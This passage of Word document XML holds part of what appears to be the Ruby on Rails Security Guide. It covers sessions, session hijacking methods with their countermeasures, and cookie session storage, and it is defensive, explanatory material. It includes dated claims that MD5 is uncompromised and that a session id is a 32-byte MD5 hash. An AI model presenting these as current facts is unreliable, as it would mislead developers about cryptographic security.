        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Cross-Site Scripting (</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>XSS</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="58813770" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId687" w:anchor="8-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>CSS</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Injection</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7038AA90" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId688" w:anchor="8-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Textile Injection</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="48F45637" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId689" w:anchor="8-6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Ajax Injection</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="609C5837" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId690" w:anchor="8-7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Command Line Injection</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="68F126D2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId691" w:anchor="8-8" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Header Injection</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="066B3543" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId692" w:anchor="9" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Additional Resources</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="59E6FF30" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>1 Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD8C8F4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Web application frameworks are made to help developers building web applications. Some of them also help you with securing the web application. In fact one framework is not more secure than another: If you use it correctly, you will be able to build secure apps with many frameworks. Ruby on Rails has some clever helper methods, for example against </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> injection, so that this is hardly a problem. It’s nice to see that all of the Rails applications I audited had a good level of security.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A1FD6D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In general there is no such thing as plug-n-play security. Security depends on the people using the framework, and sometimes on the development method. And it depends on all layers of a web application environment: The back-end storage, the web server and the web application itself (and possibly other layers or applications).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71840EB1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The Gartner Group however estimates that 75% of attacks are at the web application layer, and found out “that out of 300 audited sites, 97% are vulnerable to attack”. This is because web applications are relatively easy to attack, as they are simple to understand and manipulate, even by the lay person.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7234A32B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The threats against web applications include user account hijacking, bypass of access control, reading or modifying sensitive data, or presenting fraudulent content. Or an attacker might be able to install a Trojan horse program or unsolicited e-mail sending software, aim at financial enrichment or cause brand name damage by modifying company resources. In order to prevent attacks, minimize their impact and remove points of attack, first of all, you have to fully understand the attack methods in order to find the correct countermeasures. That is what this guide aims at.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6864A706" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In order to develop secure web applications you have to keep up to date on all layers and know your enemies. To keep up to date subscribe to security mailing lists, read security blogs and make updating and security checks a habit (check the </w:t>
      </w:r>
      <w:hyperlink r:id="rId693" w:anchor="additional-resources" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Additional Resources</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> chapter). I do it manually because that’s how you find the nasty logical security problems.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78687B80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>2 Sessions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B56D409" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A good place to start looking at security is with sessions, which can be vulnerable to particular attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D1144E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 What are Sessions?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A8CE70D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a stateless protocol. Sessions make it stateful.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A8899BD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Most applications need to keep track of certain state of a particular user. This could be the contents of a shopping basket or the user id of the currently logged in user. Without the idea of sessions, the user would have to identify, and probably authenticate, on every request. Rails will create a new session automatically if a new user accesses the application. It will load an existing session if the user has already used the application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="457ED475" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A session usually consists of a hash of values and a session id, usually a 32-character string, to identify the hash. Every cookie sent to the client’s browser includes the session id. And the other way round: the browser will send it to the server on every request from the client. In Rails you can save and retrieve values using the session method:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="77BE4666" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2DA95C74" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>session[:user_id] = @current_user.id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="554CA0B6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User.find(session[:user_id])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="599FA08D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 Session id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BDF37D5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>The session id is a 32 byte long MD5 hash value.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6DD4D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A session id consists of the hash value of a random string. The random string is the current time, a random number between 0 and 1, the process id number of the Ruby interpreter (also basically a random number) and a constant string. Currently it is not feasible to brute-force Rails’ session ids. To date MD5 is uncompromised, but there have been collisions, so it is theoretically possible to create another input text with the same hash value. But this has had no security impact to date.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="198A7274" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 Session Hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F5590C6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Stealing a user’s session id lets an attacker use the web application in the victim’s name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409FE474" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Many web applications have an authentication system: a user provides a user name and password, the web application checks them and stores the corresponding user id in the session hash. From now on, the session is valid. On every request the application will load the user, identified by the user id in the session, without the need for new authentication. The session id in the cookie identifies the session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510C1EF7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Hence, the cookie serves as temporary authentication for the web application. Everyone who seizes a cookie from someone else, may use the web application as this user – with possibly severe consequences. Here are some ways to hijack a session, and their countermeasures:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="590CC7FD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="324"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Sniff the cookie in an insecure network. A wireless </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>LAN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> can be an example of such a network. In an unencrypted wireless </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>LAN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> it is especially easy to listen to the traffic of all connected clients. This is one more reason not to work from a coffee shop. For the web application builder this means to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">provide a secure connection over </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>SSL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. In Rails 3.1 and later, this could be accomplished by always forcing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SSL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> connection in your application config file:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2760"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5B654C0E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A612214" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1977490464"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.force_ssl = true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5823996A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="325"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Most people don’t clear out the cookies after working at a public terminal. So if the last user didn’t log out of a web application, you would be able to use it as this user. Provide the user with a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>log-out button</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the web application, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>make it prominent</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68C159A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="326"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Many cross-site scripting (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) exploits aim at obtaining the user’s cookie. You’ll read </w:t>
      </w:r>
      <w:hyperlink r:id="rId694" w:anchor="cross-site-scripting-xss" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">more about </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>XSS</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> later.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C99A6A6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="327"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Instead of stealing a cookie unknown to the attacker, he fixes a user’s session identifier (in the cookie) known to him. Read more about this so-called session fixation later.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9B0A9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The main objective of most attackers is to make money. The underground prices for stolen bank login accounts range from $10–$1000 (depending on the available amount of funds), $0.40–$20 for credit card numbers, $1–$8 for online auction site accounts and $4–$30 for email passwords, according to the </w:t>
      </w:r>
      <w:hyperlink r:id="rId695" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Symantec Global Internet Security Threat Report</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF320D9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.4 Session Guidelines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3FE950" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Here are some general guidelines on sessions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E6A304" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="328"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Do not store large objects in a session</w:t>
      </w:r>
      <w:r>
        <w:t>. Instead you should store them in the database and save their id in the session. This will eliminate synchronization headaches and it won’t fill up your session storage space (depending on what session storage you chose, see below). This will also be a good idea, if you modify the structure of an object and old versions of it are still in some user’s cookies. With server-side session storages you can clear out the sessions, but with client-side storages, this is hard to mitigate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06089B29" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="329"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Critical data should not be stored in session</w:t>
      </w:r>
      <w:r>
        <w:t>. If the user clears his cookies or closes the browser, they will be lost. And with a client-side session storage, the user can read the data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13352B0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.5 Session Storage</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C112D8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Rails provides several storage mechanisms for the session hashes. The most important are ActiveRecord::SessionStore and ActionDispatch::Session::CookieStore.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFCDE1A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There are a number of session storages, i.e. where Rails saves the session hash and session id. Most real-live applications choose ActiveRecord::SessionStore (or one of its derivatives) over file storage due to performance and maintenance reasons. ActiveRecord::SessionStore keeps the session id and hash in a database table and saves and retrieves the hash on every request.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E1928A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Rails 2 introduced a new default session storage, CookieStore. CookieStore saves the session hash directly in a cookie on the client-side. The server retrieves the session hash from the cookie and eliminates the need for a session id. That will greatly increase the speed of the application, but it is a controversial storage option and you have to think about the security implications of it:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BFA526" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="330"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cookies imply a strict size limit of 4kB. This is fine as you should not store large amounts of data in a session anyway, as described before. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Storing the current user’s database id in a session is usually ok</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482FAE05" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="331"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The client can see everything you store in a session, because it is stored in clear-text (actually Base64-encoded, so not encrypted). So, of course, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>you don’t want to store any secrets here</w:t>
      </w:r>
      <w:r>
        <w:t>. To prevent session hash tampering, a digest is calculated from the session with a server-side secret and inserted into the end of the cookie.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6833E289" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">That means the security of this storage depends on this secret (and on the digest algorithm, which defaults to SHA512, which has not been compromised, yet). So </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>don’t use a trivial secret, i.e. a word from a dictionary, or one which is shorter than 30 characters</w:t>
      </w:r>
      <w:r>
        <w:t>. Put the secret in your environment.rb:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5928"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="72AC6FF5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2986911D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
